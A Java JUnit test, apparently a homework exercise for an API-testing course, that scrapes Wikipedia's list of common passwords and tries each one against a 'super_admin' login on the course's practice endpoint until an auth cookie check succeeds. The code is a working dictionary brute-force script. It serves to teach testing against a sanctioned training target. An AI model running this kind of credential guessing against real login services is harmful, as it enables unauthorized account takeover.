import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.net.URL;
import java.util.*;

public class SuperAdmin {

    private static Document getPage() throws IOException {
        // захожу на википедию и получаю всю страницу в формате html
        String url = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords";
        Document page = Jsoup.parse(new URL(url), 3000);
        return page;
    }

    @Test
    public void testSuperAdmin() throws IOException {
        // разбираю html, получаю все пароли из нужной таблицы, кладу их в виде строки в переменную pass
        // затем преобразую строку в связанный список set и тем самым удаляю дубликаты паролей
        Document page = getPage();
        Element table = page.select("table[class=\"wikitable\"]").get(1);
        Elements passwords = table.select("td[align=\"left\"]");

        String pass;
        Set<String> set = new HashSet<String>();
        for (Element password : passwords) {
            pass = password.select("td[align=\"left\"]").text();
            set.add(pass);
        }

        // прохожу по списку set и каждый раз беру одно значение пароля и передаю его в первый запрос
        Iterator<String> it = set.iterator();
        while (it.hasNext()) {

            Map<String, String> data = new HashMap<>();
            data.put("login", "super_admin");
            String password = it.next();
            data.put("password", password);

            Response response = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String responseCookie = response.getCookie("auth_cookie"); // извлекаю полученные куки


            Map<String, String> cookies = new HashMap<>();
            if (responseCookie != null) {
                cookies.put("auth_cookie", responseCookie);

                // отправляю второй запрос с полученными куки
                Response response1 = RestAssured
                        .given()
                        .cookies(cookies)
                        .when()
                        .get("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                        .andReturn();

                // проверяю, если в ответе текст совпадает с нужным "вы авторизованы", то вывожу на печать этот текст и правильный пароль
                if (response1.getBody().htmlPath().getString("You are authorized").equals("You are authorized")) {
                    System.out.println("You are authorized" + " and password is " + "\"" + password + "\".");
                }

            }
        }
    }
}
